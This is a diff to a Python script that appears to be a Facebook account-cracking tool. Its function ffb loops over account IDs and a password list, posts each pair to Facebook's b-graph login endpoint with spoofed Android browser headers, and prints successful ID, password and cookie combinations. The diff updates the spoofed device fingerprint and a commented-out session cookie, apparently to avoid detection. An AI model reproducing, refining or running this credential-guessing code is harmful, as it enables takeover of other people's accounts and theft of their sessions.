@@ -1818,17 +1818,17 @@ def ffb(ids,names,passlist):
                         headers=headers = {
     'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=7SkRZrqmY4oO7qo7ub1yIZP4; sb=7SkRZvgsCyJ2k-kaamie2uhU; m_pixel_ratio=3; ps_l=0; ps_n=0; wd=360x648; fr=0lOUqcMpEPwbNAFug..BmESnt..AAA.0.0.BmESoB.AWWmCGqqg20',
-    'dpr': '3',
+    # 'cookie': 'datr=4EMRZpBlrwvjyYWrsrca56md; sb=4EMRZlL-UBto8qVxajIQYEtf; m_pixel_ratio=2.75; ps_l=0; ps_n=0; wd=393x767; fr=0OWvL5ABNC3zfELEw..BmEUPg..AAA.0.0.BmEUPz.AWWEe7MS9BY',
+    'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"CPH1969"',
+    'sec-ch-ua-model': '"23027RAD4I"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-ch-ua-platform-version': '"14.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
@@ -1836,8 +1836,8 @@ def ffb(ids,names,passlist):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
-}
-                        url = 'https://b-graph.facebook.com/auth/login'                
+}   
+			url = 'https://b-graph.facebook.com/auth/login'                
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
                                         print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+' | ' + joined(coki) + '\033[1;97m')
